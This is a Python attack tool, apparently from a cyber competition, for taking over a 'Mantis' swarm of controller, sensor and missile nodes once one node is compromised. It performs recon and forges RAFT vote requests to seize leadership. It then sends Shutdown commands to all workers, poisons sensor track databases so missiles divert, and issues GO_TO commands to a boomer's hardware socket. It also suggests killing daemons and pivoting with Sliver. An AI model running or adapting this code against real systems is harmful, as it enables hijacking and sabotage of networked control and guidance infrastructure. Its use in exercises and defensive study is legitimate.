"""mantis.py - one-shot Mantis swarm takedown (competition build).

Drop on ANY compromised Mantis node (controller / sensor / boomer) and run.
No args = auto mode:
    1. Recon the node (identity, peers, sockets, DB, beacon).
    2. On controller: kill chain (win election -> Shutdown every worker).
    3. On sensor: overwrite tracks in gps_db_path SQLite. The sensor's own
       comms daemon republishes the poisoned tracks to its controller every
       5s, so boomers hunting those IDs get pulled off target.
    4. On boomer: self-GO_TO to ocean via hw_socket_path (removes this one
       missile; cannot help peers).

Manual modes:
    python3 mantis.py recon        # print intel, do nothing
    python3 mantis.py kill         # kill chain only (controller)
    python3 mantis.py divert       # divert only (sensor/boomer/controller)
    python3 mantis.py auto         # default; node-type-aware takedown

Stdlib only. Built for real Mantis per Sensor.md / Controller.md / Boomer.md.
Hardened against:
  - NixOS ARM64 with no PyYAML, busybox shells, absolute paths only
  - Config at non-default path via $*_CONFIG_PATH env vars (checked first)
  - RAFT election cascade (extreme term, re-checks leader each round)
  - Comms-socket JSON decoder desync (fresh socket per message)
  - verify_signatures: true finals variant (unsigned msgs still attempted;
    signed path requires a local key file and isn't wired by default)
  - Fetcher 5s re-launch: every pulse completes well under 5s
"""

import base64
import glob
import json
import os
import re
import socket
import sqlite3
import sys
import time

# ============================================================================
#  TUNABLES
# ============================================================================
SENSOR_PORT_DEFAULT = 8000   # Sensor.md sample config; controllers use 10000
# Divert target: mid-Atlantic well outside every ELCOA kill box.
# Per RRII ELCOA MANTIS (DTG 101200EDT APR 2026):
#   Option A (MLCOA):  49.258N / -61.891W
#   Option B:          49.154N / -61.764W
#   Option C (CRITICAL): 49.316N / -62.015W
# All three kill boxes cluster within ~0.2 of 49.2N / -62W.
# Boomer max range 500km (RRII+Mantis+Design §3). Option A launch is at
# 51.75N / -55.95W — already ~514km from its kill box, i.e. at the edge
# of fuel. Diverting to 45N / -40W (~2200km away) guarantees fuel out.
DIVERT_LAT = 45.0
DIVERT_LON = -40.0
DIVERT_ALT = 1.0             # sea-level for boomer GO_TO (meters)
# Operational: RRII ELCOA §4 - "Maximum three failed interceptions before
# AO Rizzo is too degraded." Translate: sustained ~100% success needed.
LOOP_INTERVAL = 2.0
SOCKET_TIMEOUT = 2.0
ELECTION_RECV_CHUNK = 65536
ELECTION_TERM = 999_999_999  # defeats any re-election cascade
CAPTURED_COA_PATH = "/tmp/captured_coa.json"

# Env vars checked FIRST per Controller.md §1.1 — systemd units point here.
ENV_CONFIG_KEYS = [
    "CONTROLLER_CONFIG_PATH", "SENSOR_CONFIG_PATH", "BOOMER_CONFIG_PATH",
    "CONFIG_PATH",
]

# Fallback filesystem paths (NixOS commonly uses /etc/<role>/config.yaml).
CONFIG_PATHS = [
    ("/etc/controller/config.yaml", "controller"),
    ("/etc/sensor/config.yaml",     "sensor"),
    ("/etc/boomer/config.yaml",     "boomer"),
]

# Absolute paths for NixOS where /usr/bin is absent.
NIXOS_BIN = "/run/current-system/sw/bin"

# Track DB fallbacks if cfg.gps_db_path is missing. The authoritative path
# is cfg.gps_db_path per Sensor.md §Configuration Model.
TRACK_DB_PATHS = [
    "/var/lib/mantis/tracks.db",
    "/var/lib/sensor/tracks.db",
    "/var/lib/sensor/gps.db",
    "/var/lib/mantis/sensor.db",
]


# ============================================================================
#  CONFIG DISCOVERY (NixOS-safe, PyYAML-free)
# ============================================================================
def load_config():
    """Return (cfg_dict, node_type, config_path).

    Discovery order per real Mantis deployments:
      1. Env vars (systemd units set *_CONFIG_PATH).
      2. /etc/<role>/config.yaml canonical locations.
      3. systemd unit file scan (if systemctl is available).
      4. Wide glob of /etc/*/config.yaml with schema sniff.
    """
    for k in ENV_CONFIG_KEYS:
        path = os.environ.get(k)
        if path and os.path.exists(path):
            cfg = _parse_yaml_file(path)
            if cfg:
                return cfg, _infer_type(k + path, cfg), path

    for p, t in CONFIG_PATHS:
        if os.path.exists(p):
            cfg = _parse_yaml_file(p)
            if cfg:
                return cfg, t, p

    systemctl = _find_bin("systemctl")
    if systemctl:
        for svc in ("controller", "sensor", "boomer", "mantis-controller",
                    "mantis-sensor", "mantis-boomer", "commsDaemon",
                    "hwDaemon"):
            try:
                unit = os.popen(
                    f"{systemctl} cat {svc} 2>/dev/null").read()
            except Exception:
                unit = ""
            for line in unit.splitlines():
                m = re.search(r'CONFIG_PATH=["\']?([^"\'\s]+)', line)
                if m and os.path.exists(m.group(1)):
                    cfg = _parse_yaml_file(m.group(1))
                    if cfg:
                        return cfg, _infer_type(svc + m.group(1), cfg), \
                               m.group(1)

    for p in glob.glob("/etc/*/config.yaml") + glob.glob("/etc/*/*.yaml"):
        cfg = _parse_yaml_file(p)
        if cfg and ("sensors" in cfg or "controllers" in cfg):
            return cfg, _infer_type(p, cfg), p

    return None, None, None


def _find_bin(name):
    """Return an executable path for `name` on NixOS or standard Linux."""
    for root in (NIXOS_BIN, "/usr/bin", "/bin", "/usr/local/bin"):
        p = os.path.join(root, name)
        if os.path.exists(p):
            return p
    return None


def _infer_type(hint, cfg):
    """Determine node type from the config schema.

    Unique fields per the official docs:
      controller: election_socket_path          (Controller.md §Deployment)
      sensor:    gps_db_path                    (Sensor.md §Configuration Model)
      boomer:    hunt + hw_socket_path, no gps  (Boomer.md §Configuration Model)

    Schema wins over the hint string so a mislabelled env var
    (e.g. CONTROLLER_CONFIG_PATH pointing at a sensor config) does
    not cause `kill` mode to run on the wrong node.
    """
    if not isinstance(cfg, dict):
        cfg = {}
    if "election_socket_path" in cfg:
        return "controller"
    if "gps_db_path" in cfg:
        return "sensor"
    if ("hunt" in cfg or "hw_socket_path" in cfg) and \
       "gps_db_path" not in cfg and "election_socket_path" not in cfg:
        return "boomer"
    hl = hint.lower()
    for k in ("controller", "sensor", "boomer"):
        if k in hl:
            return k
    return "unknown"


def _parse_yaml_file(path):
    try:
        with open(path) as f:
            text = f.read()
    except Exception:
        return None
    try:
        import yaml
        return yaml.safe_load(text)
    except Exception:
        pass
    return _tiny_yaml(text)


def _tiny_yaml(text):
    """Parses the subset of YAML our configs use: scalars, nested dicts,
    and lists of dicts with one-line key: value pairs."""
    root = {}
    stack = [(-1, root)]
    lines = text.splitlines()
    i = 0
    while i < len(lines):
        raw = lines[i]
        stripped = raw.strip()
        if not stripped or stripped.startswith("#"):
            i += 1
            continue
        indent = len(raw) - len(raw.lstrip())
        while stack and indent <= stack[-1][0] and stack[-1][0] != -1:
            stack.pop()
        parent = stack[-1][1]

        if stripped.startswith("- "):
            item_body = stripped[2:]
            if not isinstance(parent, list):
                i += 1
                continue
            item = {}
            parent.append(item)
            if ":" in item_body:
                k, _, v = item_body.partition(":")
                item[k.strip()] = _scalar(v.strip())
            stack.append((indent, item))
            i += 1
            continue

        if ":" in stripped:
            key, _, val = stripped.partition(":")
            key = key.strip()
            val = val.strip()
            if not val:
                j = i + 1
                while j < len(lines) and (not lines[j].strip() or
                                          lines[j].strip().startswith("#")):
                    j += 1
                if j < len(lines):
                    nxt = lines[j]
                    nxt_indent = len(nxt) - len(nxt.lstrip())
                    if nxt_indent > indent and nxt.strip().startswith("- "):
                        new = []
                    else:
                        new = {}
                else:
                    new = {}
                if isinstance(parent, dict):
                    parent[key] = new
                stack.append((indent, new))
            else:
                if isinstance(parent, dict):
                    parent[key] = _scalar(val)
        i += 1
    return root


def _scalar(v):
    v = v.strip().strip('"').strip("'")
    low = v.lower()
    if low in ("null", "~", "none", ""): return None
    if low == "true":  return True
    if low == "false": return False
    if re.fullmatch(r"-?\d+", v): return int(v)
    if re.fullmatch(r"-?\d*\.\d+([eE][+-]?\d+)?", v):
        try: return float(v)
        except ValueError: return v
    if re.fullmatch(r"-?\d+[eE][+-]?\d+", v):
        try: return float(v)
        except ValueError: return v
    return v


# ============================================================================
#  RECON
# ============================================================================
def recon(cfg, ntype, path):
    """Per-node intel dump. Drives the operator's decision:
      - Can we win the election? (controller + peers reachable)
      - Can we forge messages?  (verify_signatures off, or key_path present)
      - Can we poison tracks?   (gps_db_path writable on sensor)
      - Can we divert this node? (hw_socket_path on boomer)
    """
    print("=" * 64)
    print("  MANTIS RECON")
    print("=" * 64)
    print(f"Config file:     {path}")
    print(f"Node type:       {ntype}")
    print(f"Node ID:         {cfg.get('id','?')}")
    print(f"IFF code:        {cfg.get('iff','?')}")
    listen = f"{cfg.get('listen_address','?')}:{cfg.get('listen_port','?')}"
    print(f"Listen:          {listen}")

    vs = cfg.get("verify_signatures")
    vs_tag = "?"
    if vs is True:   vs_tag = "TRUE  (inbound sigs enforced — finals mode)"
    if vs is False:  vs_tag = "FALSE (inbound accepted unsigned)"
    print(f"verify_sigs:     {vs_tag}")

    kp = cfg.get("key_path")
    if kp:
        kp_ok = os.path.exists(kp) and os.access(kp, os.R_OK)
        print(f"key_path:        {kp}  [{'readable' if kp_ok else 'UNREADABLE'}]")
    else:
        print(f"key_path:        (none — outbound messages sent unsigned)")

    # --- Sockets ---
    sockets = {
        "comms":    cfg.get("comms_socket_path"),
        "election": cfg.get("election_socket_path"),
        "hw":       cfg.get("hw_socket_path"),
    }
    print("\nSockets:")
    for name, p in sockets.items():
        if not p:
            print(f"  {name:<9} (not in config)")
            continue
        if not os.path.exists(p):
            print(f"  {name:<9} {p}  [MISSING]")
            continue
        writable = os.access(p, os.W_OK)
        readable = os.access(p, os.R_OK)
        flags = []
        if readable: flags.append("r")
        if writable: flags.append("w")
        print(f"  {name:<9} {p}  [{'+'.join(flags) or 'no-access'}]")

    # --- Peers ---
    def _peer_block(label, items):
        items = [i for i in (items or []) if isinstance(i, dict)]
        print(f"\n{label} ({len(items)}):")
        for i in items[:5]:
            iid = str(i.get("id", "?"))[:8]
            ip  = i.get("ip_addr", "?")
            print(f"  {iid}  {ip}")
        if len(items) > 5:
            print(f"  ... +{len(items)-5} more")

    _peer_block("Controllers", cfg.get("controllers"))
    _peer_block("Sensors",     cfg.get("sensors"))
    _peer_block("Boomers",     cfg.get("boomers"))

    # --- Role-specific ---
    if ntype == "sensor":
        db = _resolve_track_db(cfg)
        if db:
            try:
                conn = sqlite3.connect(f"file:{db}?mode=ro", uri=True,
                                       timeout=1.0)
                cnt = conn.execute(
                    "SELECT COUNT(*) FROM tracks").fetchone()[0]
                conn.close()
                w = "writable" if os.access(db, os.W_OK) else "READ-ONLY"
                print(f"\nTrack DB:        {db}")
                print(f"                 {cnt} tracks, {w}")
            except Exception as e:
                print(f"\nTrack DB:        {db}  (read failed: {e})")
        else:
            print(f"\nTrack DB:        NOT FOUND  (cfg.gps_db_path missing)")
            print(f"                 divert will fail — find the DB first.")

    if ntype == "boomer":
        hunt = cfg.get("hunt") or {}
        if hunt:
            print(f"\nHunt config:")
            for k in ("poll_interval", "reach_distance_meters"):
                if hunt.get(k) is not None:
                    print(f"  {k}: {hunt[k]}")

    if ntype == "controller":
        mp = os.environ.get("CONTROLLER_MISSION_PATH")
        if mp:
            mp_ok = os.path.exists(mp)
            print(f"\nMission path:    {mp}  "
                  f"[{'present' if mp_ok else 'MISSING'}]")
        es = cfg.get("election_socket_path")
        coa = check_leader(es)
        if coa:
            n = len(coa.get("endorsements") or [])
            print(f"\nLeader status:   LEADER  ({n} endorsements)")
            for e in (coa.get("endorsements") or [])[:3]:
                endr = str(e.get("endorser", "?"))[:8]
                exp  = e.get("expiration", "?")
                print(f"  endorser={endr}  exp={exp}")
        else:
            peers = [p for p in (cfg.get("controllers") or [])
                     if isinstance(p, dict)]
            quorum = (len(peers) + 1) // 2 + 1
            print(f"\nLeader status:   NOT LEADER")
            print(f"                 quorum needs {quorum} of "
                  f"{len(peers)+1} controllers")
    print()


# ============================================================================
#  ELECTION PRIMITIVES (robust recv, fresh socket per message)
# ============================================================================
def recv_all(sock):
    buf = bytearray()
    try:
        while True:
            chunk = sock.recv(ELECTION_RECV_CHUNK)
            if not chunk:
                break
            buf.extend(chunk)
    except Exception:
        pass
    return bytes(buf)


def check_leader(election_sock_path, verbose=False):
    """Return the current COA dict if leader, else None.
    Distinguishes hard failures (socket absent / unreachable) from
    "socket reachable but we're not leader" via the verbose flag."""
    if not election_sock_path:
        if verbose: print("[!] No election_socket_path in config")
        return None
    if not os.path.exists(election_sock_path):
        if verbose: print(f"[!] Election socket missing: {election_sock_path}")
        return None
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(3.0)
        s.connect(election_sock_path)
        data = recv_all(s)
        s.close()
    except Exception as e:
        if verbose: print(f"[!] Election socket unreachable: {e}")
        return None
    try:
        coa = json.loads(data.decode())
    except Exception:
        if verbose: print("[!] Election socket returned non-JSON (hardened?)")
        return None
    if coa.get("endorsements"):
        return coa
    return None


def _vote_request_transmission(our_id, peer_id, term):
    """Build a signed-envelope VoteRequest. Election payloads are
    base64-encoded per the real Mantis protocol."""
    payload = json.dumps({"leader": our_id, "term": term})
    return {
        "source": our_id,
        "destination": peer_id,
        "msg_type": "Election:Vote Request",
        "msg": base64.b64encode(payload.encode()).decode(),
        "msg_sig": "",
        "nonce": base64.urlsafe_b64encode(os.urandom(16)).decode().rstrip("="),
        "authority": {"endorsements": []},
    }


def send_via_comms(comms_path, tx):
    """Fresh UNIX socket per message - the comms socket is bidirectional
    and the controller writes inbound messages back on the same connection,
    so reusing one connection desyncs the JSON decoder after a few sends."""
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(3.0)
    s.connect(comms_path)
    s.sendall((json.dumps(tx) + "\n").encode())
    s.close()


def inject_vote_requests(cfg, term):
    """Send VoteRequest to every peer via local comms socket."""
    cs = cfg.get("comms_socket_path")
    our_id = cfg.get("id")
    peers = [p for p in (cfg.get("controllers") or [])
             if isinstance(p, dict) and p.get("id") and p.get("id") != our_id]
    sent = 0
    for p in peers:
        tx = _vote_request_transmission(our_id, p["id"], term)
        try:
            send_via_comms(cs, tx)
            sent += 1
        except Exception:
            pass
    return sent, len(peers)


def _save_captured_coa(coa, path=CAPTURED_COA_PATH):
    """Persist a confirmed COA so replace_election_socket.py can serve the
    real endorsements later (per Instructions.md §2.3 contract). Best
    effort — failure to write is logged but not fatal."""
    try:
        with open(path, "w") as f:
            json.dump(coa, f)
        print(f"[+] Captured COA written to {path}")
    except OSError as e:
        print(f"[!] Could not write {path}: {e}")


def win_election(cfg):
    """Attempt to become leader and return the confirmed COA, or None.

    Per Controller.md, the comms HTTP ingress layer rejects non-controller
    traffic unless the local election socket reports us as leader (non-empty
    endorsements). That means queued Shutdowns only reach workers when our
    own comms daemon sees us as leader — so we REQUIRE a confirmed COA
    before letting the kill chain run.

    On success, the COA is also persisted to CAPTURED_COA_PATH so that
    replace_election_socket.py can replay real endorsements if the election
    daemon later dethrones us."""
    es = cfg.get("election_socket_path")
    our_id = cfg.get("id")
    if not es or not our_id:
        print("[!] Missing election_socket_path or node id in config.")
        return None

    coa = check_leader(es)
    if coa and coa.get("endorsements"):
        print(f"[+] Already leader ({len(coa['endorsements'])} endorsements)")
        _save_captured_coa(coa)
        return coa

    sent, total = inject_vote_requests(cfg, ELECTION_TERM)
    print(f"[*] VoteRequest term={ELECTION_TERM} -> {sent}/{total} peers")
    time.sleep(1.2)
    coa = check_leader(es)
    if coa and coa.get("endorsements"):
        print(f"[+] Leader confirmed ({len(coa['endorsements'])} endorsements)")
        _save_captured_coa(coa)
        return coa

    print("[!] Not confirmed as leader (endorsements empty or socket error).")
    print("    Queuing Shutdown now is useless: per Controller.md workers")
    print("    are rejected at our comms ingress while we are a follower,")
    print("    so messages sit in the outbound queue forever.")
    print("[!] Escalate:")
    print("        pkill -f election")
    print("        python3 replace_election_socket.py &")
    print("        python3 mantis.py kill")
    return None


# ============================================================================
#  KILL CHAIN (controller only)
# ============================================================================
def queue_shutdowns(cfg, coa):
    """Enqueue Shutdown for every worker via the comms socket (fresh conn
    per send to dodge bidirectional-JSON desync). Returns (queued, total)."""
    comms = cfg.get("comms_socket_path")
    our_id = cfg.get("id")
    workers = []
    for group in ("sensors", "boomers"):
        for n in cfg.get(group) or []:
            if isinstance(n, dict) and n.get("id"):
                workers.append(n["id"])

    payload = base64.b64encode(b"{}").decode()
    ok = 0
    for wid in workers:
        msg = {
            "source": our_id,
            "destination": wid,
            "msg": payload,
            "msg_type": "Shutdown",
            "authority": coa,
        }
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.settimeout(3.0)
            s.connect(comms)
            s.sendall((json.dumps(msg) + "\n").encode())
            s.close()
            ok += 1
        except Exception:
            pass
    return ok, len(workers)


def kill_chain(cfg, coa, rounds=4):
    """Loop: re-confirm leadership, re-queue Shutdowns. Requires a COA
    with non-empty endorsements — without it, workers are rejected at
    our comms HTTP ingress (Controller.md §Worker Message Flow) and the
    Shutdowns never leave our outbound queue. Returns True if at least
    one round queued messages while we were confirmed leader."""
    if not coa or not coa.get("endorsements"):
        print("[!] kill_chain requires a COA with endorsements.")
        print("    Run win_election first, or escalate via")
        print("    replace_election_socket.py if RAFT is hardened.")
        return False

    print(f"[*] Kill loop: {rounds} rounds of vote+shutdown")
    total_workers = (len(cfg.get("sensors") or []) +
                     len(cfg.get("boomers") or []))
    if total_workers == 0:
        print("[!] No workers in config.")
        return False

    es = cfg.get("election_socket_path")
    cs = cfg.get("comms_socket_path")
    if not cs or not os.path.exists(cs):
        print(f"[!] Comms socket unreachable: {cs} - cannot queue Shutdown.")
        return False

    leader_rounds = 0
    last_good_coa = coa
    for i in range(1, rounds + 1):
        sent, peers = inject_vote_requests(cfg, ELECTION_TERM + i)
        time.sleep(0.4)
        live_coa = check_leader(es)
        if live_coa and live_coa.get("endorsements"):
            last_good_coa = live_coa
            leader_rounds += 1
            _save_captured_coa(live_coa)
            leader_tag = f"LEADER ({len(live_coa['endorsements'])})"
        else:
            leader_tag = "dethroned"
        ok, total = queue_shutdowns(cfg, last_good_coa)
        print(f"  round {i}: votes={sent}/{peers}, shutdowns={ok}/{total}"
              f"  [{leader_tag}]")
        time.sleep(1.6)

    if leader_rounds == 0:
        print("[!] Lost leadership before any round. Shutdowns queued but")
        print("    will not deliver — our comms daemon now rejects worker")
        print("    polls. Escalate with replace_election_socket.py.")
        return False

    print(f"[*] Leader in {leader_rounds}/{rounds} rounds.")
    print("[*] Verify dead workers on scoreboard. Survivors: use divert.")
    return True


# ============================================================================
#  DIVERSION — real-Mantis primitives only
# ============================================================================
#
#  Per Sensor.md / Controller.md / Boomer.md, the production Mantis node has
#  NO /inject HTTP endpoint. Divert strategy in the real field:
#
#    sensor     -> UPDATE gps_db_path SQLite directly. The sensor's comms
#                  daemon publishes Sensor:Track Update to the leader every
#                  5s, so downstream controller re-tasks boomers with the
#                  poisoned coords.
#    controller -> N/A as a primitive. Controller.md is explicit: messages
#                  written to the local comms socket are queued OUTBOUND
#                  only (they never hit the "Received" fan-out), and the
#                  HTTP ingress path gates non-controller traffic behind a
#                  leader check. There is no way to inject Sensor:Track
#                  Update locally. On a controller, run `mantis.py kill`
#                  and pivot to a sensor for divert.
#    boomer     -> send GO_TO to local hw_socket_path. Pulls THIS boomer
#                  off its hunt; does not rescue other missiles.
#
#  Divert coords: 45 N / -40 W, mid-Atlantic. Well outside any plausible
#  Mantis mission box. On a controller we can read CONTROLLER_MISSION_PATH
#  to confirm, but for sensor/boomer nodes we trust the constant.
#
# ============================================================================


def sensor_endpoints(cfg):
    """HTTP endpoints for sensor peers (for recon display only - we do NOT
    use these for divert; real sensors have no /inject). Respects per-peer
    listen_port when given as host:port or full URL; else SENSOR_PORT_DEFAULT.
    """
    out = []
    for s in cfg.get("sensors") or []:
        if not isinstance(s, dict):
            continue
        ip = (s.get("ip_addr") or "").strip()
        if not ip:
            continue
        if ip.startswith("http://") or ip.startswith("https://"):
            out.append(ip.rstrip("/"))
            continue
        host = ip.split("/")[0]
        port = s.get("listen_port") or SENSOR_PORT_DEFAULT
        if ":" in host:
            host, _, port_s = host.partition(":")
            try:
                port = int(port_s)
            except ValueError:
                pass
        out.append(f"http://{host}:{port}")
    return out


def _resolve_track_db(cfg):
    """Return the authoritative SQLite path per Sensor.md §Configuration
    Model (gps_db_path), with defensible fallbacks."""
    if cfg:
        for k in ("gps_db_path", "db_path", "track_db_path"):
            v = cfg.get(k)
            if v and os.path.exists(v):
                return v
    for p in TRACK_DB_PATHS:
        if os.path.exists(p):
            return p
    return None


def local_track_ids(cfg=None):
    """Read track IDs from the local sensor SQLite. Schema per Sensor.md:
    tracks(track_id TEXT PK, latitude REAL, longitude REAL)."""
    p = _resolve_track_db(cfg)
    if not p:
        return []
    try:
        conn = sqlite3.connect(f"file:{p}?mode=ro", uri=True, timeout=1.0)
        cur = conn.execute("PRAGMA table_info(tracks)")
        cols = [r[1] for r in cur.fetchall()]
        if "track_id" not in cols:
            conn.close()
            return []
        rows = conn.execute("SELECT track_id FROM tracks").fetchall()
        conn.close()
        return [r[0] for r in rows if r[0] is not None]
    except Exception:
        return []


def divert_sensor_sqlite(cfg, lat, lon):
    """Real-Mantis sensor divert: UPDATE tracks SET lat,lon in gps_db_path.
    Skips the sensor's OWN track (track_id == str(iff) per Sensor.md line
    219) so we don't drift the platform itself. Returns (changed, total)."""
    p = _resolve_track_db(cfg)
    if not p:
        print("[!] No gps_db_path found (looked at cfg.gps_db_path + "
              "fallbacks). Cannot divert from sensor SQLite.")
        return 0, 0
    # Distinguish iff=0 (valid IFF) from iff missing; `or ""` would
    # collapse 0 to "" and poison our own track.
    iff = cfg.get("iff")
    own_id = str(iff) if iff is not None else ""
    try:
        conn = sqlite3.connect(p, timeout=2.0)
        total = conn.execute("SELECT COUNT(*) FROM tracks").fetchone()[0]
        if own_id:
            cur = conn.execute(
                "UPDATE tracks SET latitude=?, longitude=? "
                "WHERE track_id<>?", (lat, lon, own_id))
        else:
            cur = conn.execute(
                "UPDATE tracks SET latitude=?, longitude=?", (lat, lon))
        changed = cur.rowcount
        conn.commit()
        conn.close()
        return changed, total
    except sqlite3.OperationalError as e:
        msg = str(e).lower()
        if "locked" in msg or "busy" in msg:
            print(f"[!] SQLite UPDATE blocked: {e}")
            print("    The hw daemon holds the write lock on gps_db_path.")
            print("    Fix: pkill -f hw   (stops detections, releases lock;")
            print("         divert pulses will succeed on retry).")
        elif "readonly" in msg or "read-only" in msg:
            print(f"[!] gps_db_path is read-only to this uid: {e}")
            print(f"    Check: ls -la {p}")
        else:
            print(f"[!] SQLite UPDATE failed: {e}")
        return 0, 0
    except Exception as e:
        print(f"[!] SQLite UPDATE failed: {e}")
        return 0, 0


def divert_controller_retry_kill(cfg):
    """Controllers have no native track-poisoning primitive (Controller.md:
    local comms socket writes are outbound-only; HTTP ingress is leader-
    gated; no local 'inbound' injection path). If kill chain failed, the
    only useful thing to do from a controller is escalate the election
    term and retry. Caller should pivot to a sensor for actual diversion.
    """
    print("[!] Controller divert is NOT a native primitive.")
    print("    Retrying kill chain with fresh term escalation.")
    coa = win_election(cfg)
    if coa is None:
        print("[!] Still cannot win leadership. Pivot to a sensor node.")
        return 0, 0
    ok, total = queue_shutdowns(cfg, coa)
    print(f"    shutdowns queued: {ok}/{total}")
    return ok, total


def divert_boomer_goto(cfg, lat, lon, alt=DIVERT_ALT):
    """Boomer hw_socket_path accepts GO_TO per Boomer.md. One-shot - this
    redirects THIS boomer only. Returns True on send, False on failure."""
    hw = cfg.get("hw_socket_path")
    if not hw or not os.path.exists(hw):
        print(f"[!] hw socket missing: {hw}")
        return False
    cmd = {
        "command": "GO_TO",
        "latitude": lat,
        "longitude": lon,
        "altitude": alt,
    }
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(SOCKET_TIMEOUT)
        s.connect(hw)
        s.sendall((json.dumps(cmd) + "\n").encode())
        try:
            s.recv(4096)  # best-effort ack; ignore contents
        except Exception:
            pass
        s.close()
        return True
    except Exception as e:
        print(f"[!] Boomer GO_TO failed: {e}")
        return False


def divert(cfg, ntype, loop=True):
    """Node-type-aware divert dispatch. Each pulse completes well under
    the 5s fetcher-restart window."""
    print(f"[*] Divert mode for {ntype} -> ocean ({DIVERT_LAT},{DIVERT_LON})")

    def pulse():
        if ntype == "sensor":
            changed, total = divert_sensor_sqlite(cfg, DIVERT_LAT, DIVERT_LON)
            return changed, total, "sqlite"
        if ntype == "controller":
            ok, total = divert_controller_retry_kill(cfg)
            return ok, total, "kill-retry"
        if ntype == "boomer":
            ok = divert_boomer_goto(cfg, DIVERT_LAT, DIVERT_LON)
            return (1 if ok else 0), 1, "hw"
        # Unknown: try any primitive we can reach.
        if _resolve_track_db(cfg):
            changed, total = divert_sensor_sqlite(cfg, DIVERT_LAT, DIVERT_LON)
            return changed, total, "sqlite-fallback"
        if cfg.get("hw_socket_path") and os.path.exists(cfg["hw_socket_path"]):
            ok = divert_boomer_goto(cfg, DIVERT_LAT, DIVERT_LON)
            return (1 if ok else 0), 1, "hw-fallback"
        return 0, 0, "none"

    if not loop:
        changed, total, mech = pulse()
        print(f"[+] divert({mech}): {changed}/{total} tracks")
        return changed > 0

    # Boomer GO_TO is one-shot by semantics — no loop.
    if ntype == "boomer":
        changed, total, mech = pulse()
        print(f"[+] divert({mech}): self GO_TO {'sent' if changed else 'FAIL'}")
        return changed > 0

    print(f"[*] Loop every {LOOP_INTERVAL}s. Ctrl-C to stop.")
    n = 0
    try:
        while True:
            n += 1
            changed, total, mech = pulse()
            print(f"  pulse {n}: {changed}/{total} via {mech}")
            if n == 1 and changed == 0:
                print("[!] First pulse changed nothing. Next steps:")
                if ntype == "sensor":
                    print("    - verify gps_db_path: check config + "
                          "ls -la on cfg.gps_db_path")
                    print("    - the hw daemon holds a write lock; if so, "
                          "kill hw first (SIGTERM) then re-run.")
                if ntype == "controller":
                    print("    - comms socket may reject impersonated peer "
                          "messages if signatures are enforced.")
                    print("    - pivot: SSH/Sliver to a sensor and run "
                          "`mantis.py divert` there.")
            time.sleep(LOOP_INTERVAL)
    except KeyboardInterrupt:
        print("\n[+] Stopped.")
    return True


# ============================================================================
#  ORCHESTRATION
# ============================================================================
def run_auto(cfg, ntype):
    if ntype == "controller":
        print("\n>>> Phase 1: Kill chain (win election -> Shutdown all)")
        coa = win_election(cfg)
        if coa is not None:
            kill_chain(cfg, coa)
        else:
            print("[!] Leadership not confirmed — skipping kill chain.")
            print("    Pivot to replace_election_socket.py, or fall through")
            print("    to controller divert (kill-retry) below.")
        print("\n>>> Phase 2: Track-update poisoning (survivor insurance)")
        divert(cfg, ntype, loop=True)
        return

    if ntype == "sensor":
        print("\n>>> Sensor divert: overwrite gps_db_path tracks ->")
        print(f"    {DIVERT_LAT},{DIVERT_LON}. Comms daemon republishes to")
        print("    controllers every 5s. Loops; Ctrl-C to stop.")
        print("    NOTE: Design doc §2.3 - boomers switch to onboard seeker")
        print("    at ~1000m. Poisoning is only effective vs. boomers still")
        print("    in midcourse. Run ASAP after gaining sensor access.")
        divert(cfg, ntype, loop=True)
        return

    if ntype == "boomer":
        print("\n>>> Boomer divert: self GO_TO ocean via hw socket.")
        print("    (Other boomers unaffected - pivot to a sensor/controller")
        print("     if you need swarm-wide takedown.)")
        divert(cfg, ntype, loop=False)
        return

    print(f"[-] Unknown node type '{ntype}'. Trying generic divert.")
    divert(cfg, ntype, loop=False)


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "auto"
    if mode in ("-h", "--help", "help"):
        print(__doc__)
        return

    cfg, ntype, path = load_config()
    if not cfg:
        print("[!] No Mantis config found on this host.")
        print("[!] Check $CONTROLLER_CONFIG_PATH / /etc/*/config.yaml.")
        sys.exit(2)

    recon(cfg, ntype, path)

    if mode == "recon":
        return
    if mode == "kill":
        if ntype != "controller":
            print("[!] kill mode needs a controller. This is a "
                  f"{ntype}. Aborting.")
            sys.exit(1)
        coa = win_election(cfg)
        if not coa or not coa.get("endorsements"):
            sys.exit(1)
        ok = kill_chain(cfg, coa)
        sys.exit(0 if ok else 1)
    if mode == "divert":
        divert(cfg, ntype, loop=True)
        return
    if mode == "auto":
        run_auto(cfg, ntype)
        return

    print(f"[!] Unknown mode: {mode}. Use: auto | recon | kill | divert")
    sys.exit(2)


if __name__ == "__main__":
    main()
